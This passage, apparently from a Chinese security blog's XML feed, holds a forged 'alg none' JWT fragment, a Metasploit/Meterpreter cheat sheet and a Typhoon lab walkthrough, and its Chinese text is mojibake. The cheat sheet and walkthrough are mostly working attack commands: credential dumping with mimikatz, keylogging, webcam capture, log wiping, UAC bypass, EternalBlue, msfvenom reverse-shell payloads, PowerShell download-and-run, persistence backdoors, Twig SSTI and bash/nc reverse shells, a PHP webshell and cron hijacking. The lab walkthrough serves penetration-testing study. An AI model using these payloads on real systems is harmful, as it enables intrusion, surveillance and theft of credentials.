key='')eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJmYW5ydWFuIiwiaWF0IjoxNTc1NDI1MjkyLCJleHAiOjE1NzU0Mjg4OTIsInN1YiI6ImFkbWluIiwiZGVzY3JpcHRpb24iOiJhZG1pbihhZG1pbikiLCJqdGkiOiJqd3QifQ. åˆ°è¿™é‡Œè…°æ–©äº†ï¼Œä¸é™æœŸå’•å’•å’•ã€‚æ¯•ç«Ÿç¦»æ ¡ä¹‹åå¾ˆéš¾å†æœ‰é‚£æ ·å¤§å—çš„æ—¶é—´äº†â€¦çœ‹åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯å¾ˆè›‹ç–¼ã€‚æœ¬æ¥æ²¡æ‰“ç®—å‘çš„ï¼Œæƒ³æƒ³è¿˜æ˜¯å‘å§hhh]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit-ALL-In-One]]></title>
    <url>%2F2019%2F04%2F20%2FMetasploit-All-In-One%2F</url>
    <content type="text"><![CDATA[Meterpreter åŸºæœ¬å‘½ä»¤execute #åœ¨ç›®æ ‡æœºä¸­æ‰§è¡Œæ–‡ä»¶execute -H -i -f cmd.exe # åˆ›å»ºæ–°è¿›ç¨‹cmd.exeï¼Œ-Hä¸å¯è§ï¼Œ-iäº¤äº’clearev #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—edit c:\\1.txt #ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶ æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶lcd /tmp #æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•timestomp C:// -h #æŸ¥çœ‹å¸®åŠ©timestomp -v C://2.txt #æŸ¥çœ‹æ—¶é—´æˆ³timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txtportfwd add -l 6666 -p 3389 -r 127.0.0.1 #å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£portfwd delete -l 6666 -p 3389 -r 127.0.0.1 #å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£åˆ é™¤ è¿›ç¨‹è¿ç§» # è‡ªåŠ¨è¿ç§»,ä¸€èˆ¬æ˜¯è¿ç§»åˆ°è®°äº‹æœ¬run post/windows/manage/migrate # æ‰‹åŠ¨è¿ç§»getpid # è·å–å½“å‰è¿›ç¨‹çš„pidps # æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹migrate &lt;pidå€¼ #å°†Meterpreterä¼šè¯ç§»æ¤åˆ°æŒ‡å®špidå€¼è¿›ç¨‹ä¸­kill &lt;pidå€¼ #æ€æ­»è¿›ç¨‹ ä¿¡æ¯æœé›†sysinfoarpgetproxy #æŸ¥çœ‹ä»£ç†ä¿¡æ¯idletime # æŸ¥çœ‹è¿è¡Œæ—¶é—´route # æŸ¥çœ‹å­ç½‘getuid # æŸ¥çœ‹ç”¨æˆ·åä¸æƒé™run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœºrun post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœºrun post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒºrun post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯run post/windows/gather/dumplinks #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œrun post/windows/gather/enum_ie #è·å–IEç¼“å­˜run post/windows/gather/enum_chrome #è·å–Chromeç¼“å­˜run post/windows/gather/enum_patches #è¡¥ä¸ä¿¡æ¯run post/windows/gather/enum_domain #æŸ¥æ‰¾åŸŸæ§run post/windows/gather/enum_logged_on_users # å·²ç™»å½•ç”¨æˆ·åˆ—ä¸¾run post/windows/manage/killav # æ€æ­»æ€è½¯run post/windows/manage/enable_rdp # å¯åŠ¨è¿œç¨‹æ¡Œé¢ ææƒæ¨¡å—getsystem # æšä¸¾è¡¥ä¸backgrounduse post/windows/gather/enum_patchesset sessions 1runuse post/mutli/recon/local_exploit_suggester #æšä¸¾ææƒexp BypassUACbackrounduse exploit/windows/local/bypassuacset session 1run exploit/windows/local/bypassuacexploit/windows/local/bypassuac_comhijackexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_fodhelperexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_injection_winsxsexploit/windows/local/bypassuac_sluihijackexploit/windows/local/bypassuac_vbs ä»¤ç‰Œæ“çºµä»¤ç‰Œä¼ªé€ use incognitolist_tokens -u #åˆ—å‡ºtokenimpersonate_token WIN-57TJ4B561MT\\Administratorshellwhoamirev2self #è¿”å›åŸå§‹token çªƒå–ä»¤ç‰Œsteal_token &lt;pidå€¼ #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token å…ˆpsdrop_token #åˆ é™¤çªƒå–çš„token å†…æ ¸ææƒrun post/windows/gather/enum_patches #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯use exploit/windows/local/ms10_092_schelevatorset session 1exploit å¯†ç æŠ“å–load mimikatzwdigest #è·å–Wdigestå¯†ç mimikatz_command -f samdump::hashes #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤ æŠ“å–hashmimikatz_command -f samdump:: #æŸ¥çœ‹ä»‹ç»mimikatz_command -f sekurlsa::searchPasswordsmimikatz_command -f a:: #é€šè¿‡åŠ è½½é”™è¯¯æ¨¡å—æŸ¥çœ‹å¸®åŠ©mimikatz_command -f hash:: #é€‰ç”¨è¯¥æ¨¡å—msv #æŠ“å–ç³»ç»Ÿhashtspkgkerberos #æŠ“å–ç³»ç»Ÿç¥¨æ®ssp #ipc$å¯†ç wdigest #è·å–ç³»ç»Ÿè´¦å·ä¿¡æ¯ use post/windows/gather/hashdump set session 1run#orhashdump #å¯ä»¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hash#éœ€è¦SYSTEMæƒé™#å¦‚æœå¼€å¯äº†UACä¼šå¤±è´¥ï¼Œéœ€è¦å…ˆç»•è¿‡UACrun post/windows/gather/smart_hashdump å±å¹•æŠ“å–load espiascreengrab screenshot æ‘„åƒå¤´æŠ“å–webcam_snap # ç›´æ’­webcam_stream é”®ç›˜æ“çºµé”®ç›˜å¼€å…³uictl [enable/disable] [keyboard/mouse/all] #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡uictl disable mouse #ç¦ç”¨é¼ æ ‡uictl disable keyboard #ç¦ç”¨é”®ç›˜ é”®ç›˜è®°å½•keyscan_start #å¼€å§‹é”®ç›˜è®°å½•keyscan_dump #å¯¼å‡ºè®°å½•æ•°æ®keyscan_stop #ç»“æŸé”®ç›˜è®°å½• æ·»åŠ ç”¨æˆ·run post/windows/manage/enable_rdp USERNAME=*** PASSWORD=***run getgui -u example_username -p example_password #ä¸æ¨èrun post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #å°†3389ç«¯å£è½¬å‘åˆ°6662 å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exeé€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤ æ–‡ä»¶æ“ä½œdownload c:\test.txt /root upload /root/test.txt c:\ æ–‡ä»¶æœç´¢search -f *flag*search -f *.txt æ³¨å†Œè¡¨æ“ä½œreg â€“h -d æ³¨å†Œè¡¨ä¸­å€¼çš„æ•°æ®. -k æ³¨å†Œè¡¨é”®è·¯å¾„ -v æ³¨å†Œè¡¨é”®åç§° enumkey æšä¸¾å¯è·å¾—çš„é”® setval è®¾ç½®é”®å€¼ queryval æŸ¥è¯¢é”®å€¼æ•°æ® MetasploitåŸºæœ¬å‘½ä»¤setgunsetg #å¯ä»¥é…ç½®å…¨å±€å˜é‡#åˆ é™¤ç›®æ ‡æœºä¸Šçš„åº”ç”¨ç¨‹åºã€ç³»ç»Ÿå’Œå®‰å…¨æ—¥å¿—clearev è‡ªåŠ¨è·¯ç”±run get_local_subnets # æŸ¥çœ‹ç½‘æ®µrun autoroute -s ip/24 # è·¯ç”±å­ç½‘run post/windows/manage/autoroute # æŸ¥çœ‹å¹¶è·¯ç”±å­ç½‘backgroundroute add ç›®æ ‡ip æ©ç  session_idroute print é…ç½®ä»£ç†use auxiliary/server/socks4a set srvhost 127.0.0.1set srvport 1080run msfç«¯å£æ‰«æuse auxiliary/scanner/portscan/tcpset rhostsset ports 21-25,80-90,8080-8090,1433,3306,1521,445,139,135run msf_arpæ‰«ærun post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389 nmapå­˜æ´»æ‰«ædb_nmap --min-hostgroup 1024 --min-parallelism 1024 -p 445 10.0.0.0-10.255.255.255 #-sn åº”ç”¨æ‰«æ#/usr/share/metasploit-framework/modules/auxiliary/scanner/use auxiliary/scanner/http/dir_scanneruse auxiliary/scanner/http/jboss_vulnscanuse auxiliary/scanner/oracle/oracle_loginauxiliary/scanner/telnet/telnet_login #TELNETç™»å½•scanner/vnc/vnc_none_auth #VNCç©ºå£ä»¤æ‰«æauxiliary/scanner/ssh/ssh_loginSSH #ç™»å½•æµ‹è¯•auxiliary/scanner/portscan #ç«¯å£æ‰«æ---smbauxiliary/scanner/smb/smb_version #SMBç³»ç»Ÿç‰ˆæœ¬æ‰«æauxiliary/scanner/smb/smb_enumusers #SMBæšä¸¾auxiliary/scanner/smb/smb_login #SMBå¼±å£ä»¤auxiliary/scanner/smb/psexec_command #SMBç™»å½•ä¸”æ‰§è¡Œå‘½ä»¤---mssqlauxiliary/scanner/mssql/mssql_loginscanner/mssql/mssql_ping #ä¸»æœºä¿¡æ¯æ‰«æadmin/mssql/mssql_enum #æšä¸¾admin/mssql/mssql_exec #æ‰§è¡Œå‘½ä»¤admin/mssql/mssql_sql #æŸ¥è¯¢scanner/mssql/mssql_login #å¼±å£ä»¤æ‰«æ---mysqlauxiliary/scanner/mysql/mysql_versionauxiliary/admin/mysql/mysql_enum #æšä¸¾auxiliary/admin/mysql/mysql_sql #è¯­å¥æ‰§è¡Œauxiliary/scanner/mysql/mysql_login #å¼±å£ä»¤æ‰«æ---smtpauxiliary/scanner/smtp/smtp_version #SMTPç‰ˆæœ¬æ‰«æauxiliary/scanner/smtp/smtp_enum #SMTPæšä¸¾auxiliary/scanner/snmp/community #SNMPæ‰«æè®¾å¤‡ æ‰«æåˆ©ç”¨æ‰¹é‡å¯¼å…¥ç›®æ ‡ipdb_import "/root/445-ip.txt" æ‰«æ445use auxiliary/scanner/smb/smb_versionset rhosts 10.0.0.0-10.0.255.255set threads 400run æ‰«æMS17-010use auxiliary/scanner/smb/smb_ms17_010set threads 50#set rhosts 10.0.0.1-10.0.255.255#set rhosts 192.168.1.1/24hosts -Rrun åˆ©ç”¨MS17-010use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/reverse_tcphosts -R use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost æœ¬æœºipset lport 4444 ç«¯å£è½¬å‘meterpreter portfwd -hUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS: -L opt è¦ç›‘å¬çš„æœ¬åœ°ä¸»æœºï¼ˆå¯é€‰ï¼‰ã€‚ -h å¸®åŠ©æ¨ªå¹…ã€‚ -l opt è¦ç›‘å¬çš„æœ¬åœ°ç«¯å£ã€‚ -p opt è¦è¿æ¥çš„è¿œç¨‹ç«¯å£ -r opt è¦è¿æ¥çš„è¿œç¨‹ä¸»æœºportfwd add -l 5555 -p 3389 -r 192.168.1.30 æŠ“åŒ…å—…æ¢use sniffersniffer_interfaces #æŸ¥çœ‹ç½‘å¡sniffer_start 2 #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…sniffer_stats 2 #æŸ¥çœ‹çŠ¶æ€sniffer_dump 2 /tmp/lltest.pcap #å¯¼å‡ºpcapæ•°æ®åŒ…sniffer_stop 2 #åœæ­¢æŠ“åŒ… RCè„šæœ¬# å°†è¾ƒå¸¸ç”¨çš„å‘½ä»¤ä¿å­˜ä¸ºxx.rc# msfconsole -r xx.rc# msf resource xx.rcuse exploit/multi/handler set payload windows/meterpreter/reverse_tcpset lhost 192.168.22.170set lport 6661exploit -j MsfvenomLinuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f bash -o textmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f sh -o text Powershellmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-reflection -o /mnt/c/Users/sherd/Desktop/a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh -o /mnt/c/Users/sherd/Desktop/a.ps1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-net -o /mnt/c/Users/sherd/Desktop/a.ps1#æ‰§è¡Œpowershell -w hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.135.100/a.ps1');a.ps1"PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File xxx.ps1#é»è´´æ‰§è¡Œmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-cmd -o /mnt/c/Users/sherd/Desktop/a.txt ä¸powersploitè”åŠ¨ #ç”Ÿæˆshellcode #ps1ç”Ÿæˆçš„shellcodeä¸€è‡´msfvenom -p windows/meterpreter/reverse_https lhost=192.168.102.1 lport=4444 -f powershell -o /var/www/html/PowerSploit/testIEX (New-Object Net.WebClient).DownloadString("http://192.168.102.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1")IEX (New-Object Net.WebClient).DownloadString("http://192.168.102.1/PowerSploit/test")#æ‰§è¡ŒInvoke-Shellcode -Shellcode ($buf) -Force Win#exe-only exe-service exe-smallmsfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe -o a.exe Javamsfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jar -o text.jar Phpmsfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; text.php Jspmsfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt;text.jsp#å…æ€msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f jsp -o /mnt/c/Users/sherd/Desktop/jsp.jspmsfvenom -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war -o text.war Aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp -o shell.asp Aspxmsfvenom -a x86 --platform win -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f aspx -o /home/niexinming/back.aspx Androidmsfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 R &gt; text.apk Metasploit BacokDoorMetsvcæœåŠ¡run metsvc -A #è‡ªåŠ¨å®‰è£…åé—¨run metsvc # è‡ªå®šä¹‰åé—¨set payload windows/metsvc_bind_tcpset rhost ç›®æ ‡ipset lport ç›®æ ‡ç›‘å¬ç«¯å£run Cymothoaä¸Šä¼ åˆ°ç›®æ ‡æœº cymotha -p 982 -s 1 -y 4444nc -nvv ç›®æ ‡ip 4444 Persistencerun persistence -A -S -U -i 60 -p 4321 -r iprun persistence -A -U -X -i 60 -p 6666 -r ip -A è‡ªå¯åŠ¨payload -S ç³»ç»Ÿè‡ªå¯åŠ¨åŠ è½½ï¼ˆæœåŠ¡ï¼‰ -U ç”¨æˆ·ç™»å½•è‡ªå¯åŠ¨ -X å¼€æœºè‡ªåŠ è½½ -i å›è¿æ—¶é—´é—´éš” -P ç›‘å¬åå‘è¿æ¥ç«¯å£å· -r ç›®æ ‡æœºå™¨IP]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€å®æˆ˜:Typhooné¶æœºå…¥ä¾µ]]></title>
    <url>%2F2019%2F04%2F19%2FTyphoon%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹ ç›®æ ‡ï¼šroot ä½œè€…ï¼šPrismaCSI éš¾åº¦å®šä½ï¼šæ—  æ¸—é€è¿‡ç¨‹ä¸­ç»å†äº†å¥½å‡ æ¬¡æ¢ç¯å¢ƒï¼ŒIPåœ°å€æœ‰ç‚¹æ··ä¹±ï¼Œè¯·ä½“è°… MongoDBæœªæˆæƒè®¿é—® 21/tcp open ftp vsftpd 3.0.222/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)25/tcp open smtp Postfix smtpd53/tcp open domain ISC BIND 9.9.5-3 (Ubuntu Linux)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))110/tcp open pop3 DovMarkdown Theme Kitecot pop3d111/tcp open rpcbind 2-4 (RPC #100000)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd (Ubuntu)445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)631/tcp open ipp CUPS 1.7993/tcp open ssl/imaps?995/tcp open ssl/pop3s?2049/tcp open nfs_acl 2-3 (RPC #100227)3306/tcp open mysql MySQL (unauthorized)5432/tcp open postgresql PostgreSQL DB 9.3.3 - 9.3.56379/tcp open redis Redis key-value store 4.0.118080/tcp open http Apache Tomcat/Coyote JSP engine 1.127017/tcp open mongodb MongoDB 3.0.1533867/tcp open nlockmgr 1-4 (RPC #100021)35717/tcp open mountd 1-3 (RPC #100005)38819/tcp open mountd 1-3 (RPC #100005)49775/tcp open mountd 1-3 (RPC #100005)58730/tcp open status 1 (RPC #100024) å¯ä»¥çœ‹åˆ°æœ‰è¾ƒå¤šæœåŠ¡é‚£ä¹ˆè·‘ç›®å½•èµ°èµ·ï¼Œå‘ç°æœ‰mongoadmin username : typhoonpassword : 789456123 æ€»å…±æœ‰ä¸¤ä¸ªé›†åˆï¼Œcredså’Œtyphoonï¼Œè´¦å·å¯†ç æ˜¯credsä¸‹çš„ï¼Œæç¤ºå¾ˆæ˜æ˜¾äº†åæ‰‹ä¸€ä¸ªSSH å°±è¿™ä¹ˆæ²¡äº†????äº‹å®ä¸Šâ€¦å®é™…çš„åˆ©ç”¨é“¾å½“ç„¶ä¸æ˜¯è¿™æ ·å­ redis-cli -h 192.168.201.6 å…ˆå°è¯•ä¸‹ä¸€èˆ¬çš„åˆ©ç”¨ï¼Œåœ¨ä½æƒé™æ—¶å†™ğŸ ä½†æ˜¯è®¿é—®é¡µé¢æ˜¯500ï¼Œå°è¯•å†™å…¥phpçš„åå¼¹shellï¼Œè¿˜æ˜¯500 å¼€ä¸‹å¤–æŒ‚çœ‹çœ‹æ€ä¹ˆå›äº‹ï¼Œwtfï¼Ÿè¿™ä¸ªæƒé™660ï¼Œå…¶ä»–ç”¨æˆ·è¯»ä¸äº†ï¼Œå°´å°¬ğŸ˜…å°è¯•crontabè®¡åˆ’ä»»åŠ¡å¼¹shellå’Œå†™sshå…¬é’¥å‡å› ä¸ºæƒé™é—®é¢˜å¤±è´¥ çªå‘å¥‡æƒ³ï¼Œæƒé™ä¸å¤Ÿ?ï¼Œé‚£æˆ‘å†™rootçš„ï¼Œæˆ–è®¸è¿è¡Œrootç™»å½•å‘¢å°è¯•å†™å…¥ç¯¡æ”¹rootç”¨æˆ·çš„å…¬é’¥â€¦ç„¶è€Œè¿˜æ˜¯éœ€è¦å¯†ç Orz æœåŠ¡ç«¯SSTIè¿™ä¸ªé¶æœºæ˜¯æœ‰å¤šä¸ªGetShellæ–¹æ³•çš„ï¼Œæˆ‘å°½é‡å°è¯•æŠŠå®ƒä»¬éƒ½æ‰¾å‡ºæ¥ æ²¡æƒ³åˆ°è¿˜ç»™é…äº†ä¸ªDVWAç»ƒä¹ å¹³å°ï¼Œé‚£ä¹ˆé»˜è®¤è´¦å·å¯†ç admin,passwordï¼Œå¯¹äºDVWAï¼Œç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰äº†ä½†è¿™æ ·å°±æ²¡æ„æ€äº†ï¼Œè€Œå¦ä¸€ä¸ªXVWAæˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç©ï¼Œæˆ‘å†³å®šè®©å®ƒå˜å¾—æ›´æœ‰æ„æ€ä¸€äº›ï¼ŒJustForFun æ¯”å¦‚è¯´æ¨¡æ¿æ³¨å…¥ å¯¹äºTWIGçš„æ¨¡æ¿æ³¨å…¥ï¼Œä½¿ç”¨ä»¥ä¸‹payloadå¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œ &#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125; Hello www-data é‚£ä¹ˆå¯ä»¥ç›´æ¥æ‹¿åˆ°shelläº† &#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.135/6666 0&gt;&amp;1")&#125;&#125; ä½†æ˜¯å°è¯•äº†å‡ ç§æ–¹æ³•éƒ½ä¼šæŠ¥å­—ç¬¦é”™è¯¯æ¢ä¸€ç§æ€è·¯ name=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("wget http://192.168.220.135/a,py /tmp/")&#125;&#125;name=&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("python /tmp/a.py")&#125;&#125; Drupalgeddon2ä¸€é”®GetShellæ²¡é”™ï¼Œæ˜¯ä¹‹å‰é‡åˆ°è¿‡çš„drupalgeddon2 Lotus RCEuse exploit/multi/http/lcms_php_execset rhosts 192.168.220.134set uri /cms/run æ³¨æ„uriæ ¼å¼ï¼Œæˆ‘åœ¨è¿™é‡Œè¢«å‘äº†o_o â€¦. SSHå¼±å¯†ç  é’ˆå¯¹OpenSSH 6.6.1ç”¨æˆ·æšä¸¾æ¼æ´ auxiliary/scanner/ssh/ssh_enumusersset rhosts 192.168.201.6set threads 20set user_file /home/user/users.txtrun çˆ†å‡ºä¸€ä¸ªadminï¼Œç›®å‰ä¸ºæ­¢å…±çš„ä¸‰ä¸ªç”¨æˆ·åadmin,typhoon,root,å†™å…¥user.txt hydra -l /home/user/user.txt -P /home/user/pass.txt ssh://192.168.201.6 admin:metallica typhoon:789456123 PostgreSQLä»»æ„æ–‡ä»¶è¯»å–ä¸å†™å…¥use auxiliary/scanner/postgres/postgres_loginset rhosts 192.168.201.6run æšä¸¾å‡ºå¼±å¯†ç  postgres:postgres æ•°æ®åº“æ˜¯ç©ºçš„â€¦ CREATE TABLE test(t TEXT);COPY test FROM '/etc/passwd';SELECT * FROM test; é€šè¿‡COPYè¯»å–æ–‡ä»¶ postfixuser å†™å…¥webshell DROP TABLE test;CREATE TABLE test(t TEXT);INSERT INTO test(t) VALUES ('&lt;?php @eval($_GET[cmd]);?&gt;');COPY test(t) TO '/var/www/html/cmd.php'; ç„¶è€Œè¿ä¸ä¸Šï¼Œè¿”å›ç©ºæ•°æ®ï¼Œå°è¯•åå¼¹ï¼Œæœ‰å¼•å·æŠ¥é”™â€¦è¯­æ³•ä¸ç†Ÿæ‚‰ï¼Œæ¯•ç«Ÿæ˜¯å³ä½¿å­¦çš„â€¦æ‹¿å‡ºnavicatå†™ï¼Œ( â€¢Ì€ Ï‰ â€¢Ì )y å…¶å®è¿™é‡Œè¿˜å¯ä»¥åˆ©ç”¨UDFææƒï¼Œä¸è¿‡å¯¹åº”ç‰ˆæœ¬çš„.soæˆ‘æ²¡æœ‰æ‰¾åˆ°â€¦è‡ªå·±æ­å»ºçš„è¯æ¯”è¾ƒéº»çƒ¦ï¼Œå°±å…ˆæ”¾ä¸‹äº† Redisæœªæˆæƒè®¿é—® ä¸MongoDbä¸€æ ·çš„åˆ©ç”¨é“¾ï¼Œä¸€æ ·çš„å‘ CUPSè¿œç¨‹æ‰“å°æœåŠ¡GetShell&amp;ææƒä½œè€…è®¾è®¡é¢„æœŸåº”è¯¥æ˜¯æœ‰631çš„cupsè¿™ä¸€æ“ä½œä½†æˆ‘æ­»æ´»å¤ç°ä¸å‡ºæ¥â€¦..tcl CVE-2015-1158 Tomcatåå°æ–‡ä»¶ä¸Šä¼ tomcaté»˜è®¤å¯†ç  å°†jspåå¼¹é©¬(reverse.jsp)æ‰“åŒ…æˆzipï¼Œæ”¹åç¼€ä¸ºwarï¼Œä¸Šä¼ è®¿é—®http://192.168.201.6:8080/reverse/reverse.jsp tomcat7@typhoon:/var/lib/tomcat7$ whoamiwhoamitomcat7 æˆåŠŸæ‹¿åˆ°tomcat7æƒé™çš„shellä¹Ÿå¯ä»¥ä½¿ç”¨msfçš„exploit/mutli/http/tomcat/tomcat_mgr_upload Struts2å¤šå¤„æ¼æ´å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªstruts2-showcaseï¼Œæ‹¿å‡ºçš„struts-scanæ‰«ä¸€æ³¢ï¼Œåˆšå¥½ä½“éªŒä¸€ä¸‹ python struts-scan.py http://192.168.201.6:8080/struts2-showcase/showcase.action ç„¶è€Œåˆ©ç”¨æœ‰é—®é¢˜â€¦è¦æ˜¯æœ‰æ—¶é—´çš„è¯ï¼Œç®—äº†ï¼Œä¸ç«‹flagäº†ç¿»ç®±å€’æŸœæ‰¾åˆ°å¤šä¸ªexpï¼Œä½“éªŒéƒ½æå·®â€¦..æœ€åæœ‰ä¸€å‘è¿˜è¡Œï¼Œå“ï¼Œè¿˜æ˜¯å¾—è‡ªå·±ä¸Šæ‰‹æ‰èƒ½ä¸°è¡£è¶³é£Ÿï¼Œäº‹åå†æä¸€æ³¢å§ ææƒææƒæ–¹æ³•ä¸€ï¼šSUIDææƒç»å…¸çš„SUIDææƒæšä¸¾Sæƒé™ç¨‹åº:find / -perm -4000 2&gt;/dev/null # ä¸‰ä¸ªå¯ç–‘ç¨‹åº/usr/bin/head/usr/bin/at/usr/bin/vim.basic head ç›´æ¥head /etc/shadowæˆåŠŸæ‹¿åˆ°æ‰€æœ‰è´¦æˆ·å¯†ç  root:$6$xlUx2G5p$.6IGWvV41rccKNfq7BeLhDFB6YZtsbpHGppKPZ0Cp9/1w1a/xx/UtyPy02f1gdv4tw4ibqOyzVcmwutrOiWlq1:17826:0:99999:7::: vim è¿™ä¸ªvimæœ‰ç‚¹å¥‡æ€ªï¼Œç›´æ¥!/bin/bashæˆ–vim -c &#39;:!/bin/sh&#39;å¾—åˆ°å¾—ä¾ç„¶æ˜¯åŸæƒé™å¾—shellâ€¦ä½†é€šè¿‡vimå¾—shellå†ä½¿ç”¨pyçš„osåº“æ‰§è¡Œå¯ä»¥å¾—åˆ°root vim -c ':python import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' at è¿™ä¸ªatå‘½ä»¤è·Ÿvimä¸€æ ·çš„å‘ at -t $now `/bin/bash -i &gt;&amp; /dev/tcp/192.168.201.7/6666 0&gt;&amp;1` å¾—åˆ°çš„æ˜¯åŸshellï¼Œä½†è¿™æ¬¡pyä¹Ÿæ•‘ä¸äº†äº†â€¦åˆ©ç”¨å¤±è´¥ ææƒæ–¹æ³•äºŒï¼šCrontabææƒåˆ©ç”¨ç‰¹æƒçš„headè¯»å–crontabä»»åŠ¡ head /var/spool/cron/crontabs/root -n 50 # m h dom mon dow command*/1 * * * * /tab/script.sh åˆ°tabä¸‹çœ‹ä¸€ä¸‹ï¼Œæƒé™æ˜¯777 typhoon@typhoon:/tab$ ls -ltotal 4-rwxrwxrwx 1 root root 86 Apr 19 20:16 script.shtyphoon@typhoon:/tab$ cat script.sh echo &quot;Typhoon is UP!&quot;#&lt;typh00n!&gt; P0st_3xpl01t3R_flaqGq &lt;typhoon!&gt; å†™å…¥åå¼¹shellå‘½ä»¤åˆ°script.sh typhoon@typhoon:/tab$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1&quot; &gt; script.sh æœªçŸ¥åŸå› åå¼¹æ²¡ç”Ÿæ•ˆï¼Œè€Œncæ˜¯æ²¡æœ‰-eå‚æ•°çš„é‚£ç§ typhoon@typhoon:/tab$ echo "mkfifo /tmp/test;cat /tmp/test|/bin/sh -i 2&gt;&amp;1|nc 192.168.200.5 6666 &gt;/tmp/test" &gt; script.sh ææƒæ–¹æ³•ä¸‰ï¼šå†…æ ¸ææƒå†…æ ¸æå–æœ€æ–¹ä¾¿ã€å¿«æ·ï¼Œä½†æ˜¯æœ‰å±€é™æ€§,exp $python -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 ... typhoon@typhoon:/tmp$ wget 192.168.200.6:8000/37292.ctyphoon@typhoon:/tmp$ gcc 37292.c 